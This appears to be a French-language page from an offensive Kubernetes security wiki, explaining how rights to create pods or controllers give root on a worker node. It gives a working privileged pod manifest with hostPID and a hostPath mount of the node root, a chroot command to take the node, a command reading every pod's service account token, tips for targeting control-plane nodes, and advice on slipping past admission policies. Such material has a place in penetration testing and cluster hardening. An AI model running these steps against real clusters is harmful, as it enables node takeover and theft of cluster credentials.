---
order: 5
title: "Création de pod vers le nœud : planifier un pod qui s'empare de son worker"
description: "La capacité de créer des pods est proche du root sur le nœud : un attaquant planifie un pod privilégié, monte le système de fichiers du nœud via hostPath ou partage les namespaces de l'hôte, puis s'en sert pour prendre le contrôle du nœud et lire les secrets de tous les pods. Les contrôleurs qui créent des pods (deployments, jobs, daemonsets) offrent la même portée de façon indirecte."
keywords:
  - create pods
  - pod privilégié
  - hostpath
  - prise de contrôle du nœud
  - rbac
---

# Création de pod vers le nœud

Dans Kubernetes, la permission de créer des pods est quasiment équivalente à un accès root sur un nœud worker. Rien n'empêche le pod créé de demander `privileged: true`, un volume `hostPath` pointant sur la racine du nœud, ou les namespaces de l'hôte, si bien qu'un attaquant capable de créer des pods en planifie un de ce type et s'échappe vers le nœud où il atterrit. Les permissions qui créent des pods indirectement, via `deployments`, `replicasets`, `jobs`, `cronjobs` ou `daemonsets`, offrent la même portée, et un daemonset place même un pod sur chaque nœud à la fois.

Vérifiez la permission, directement ou via un contrôleur :

```bash
kubectl auth can-i create pods -n <ns>
kubectl auth can-i create daemonsets -n <ns>          # a pod on every node
kubectl auth can-i create jobs -n <ns>
```

## Planifier un pod qui s'empare du nœud

```bash
cat <<YAML | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: esc, namespace: <ns> }
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: n, mountPath: /host }]
  volumes:
  - name: n
    hostPath: { path: / }
YAML
# then exec in and take the node
kubectl exec -it esc -n <ns> -- chroot /host sh
# node root: read every pod's projected token and the kubelet cert
cat /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null
```

## Cibler un nœud précis

```bash
# schedule onto a control-plane node to reach its credentials directly
# add to the pod spec:  nodeName: <control-plane-node>   (or a nodeSelector)
kubectl get nodes -o wide                              # pick the target
```

Fixer `nodeName` sur un nœud du plan de contrôle, si votre identité peut y planifier, place le pod aux côtés des identifiants propres au serveur d'API.

## Notes d'exploitation

- N'importe lequel des éléments privileged, hostPath `/` ou le socket du runtime dans la spec du pod suffit ; combinez-les pour plus de fiabilité. Les mécaniques d'évasion sont décrites dans [Pod privilégié](../pod-escape-to-node/privileged-pod.md) et [Montage hostPath](../pod-escape-to-node/hostpath-mount.md).
- Les droits de création via un contrôleur (deployment, job, daemonset) comptent parce que le contrôleur crée le pod à votre place ; un daemonset est le plus large, plaçant un pod de l'attaquant sur chaque nœud.
- Pod Security Admission ou un webhook d'admission peut rejeter les pods privilégiés ou hostPath ; si une politique restreinte bloque la spec évidente, essayez les namespaces de l'hôte seuls ou un champ moins signalé, et voyez [Webhooks d'admission](../persistence/admission-webhooks.md).

## Références

- [Kubernetes: pod security admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [BishopFox: bad pods](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [HackTricks: create pods](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-role-based-access-control-rbac)
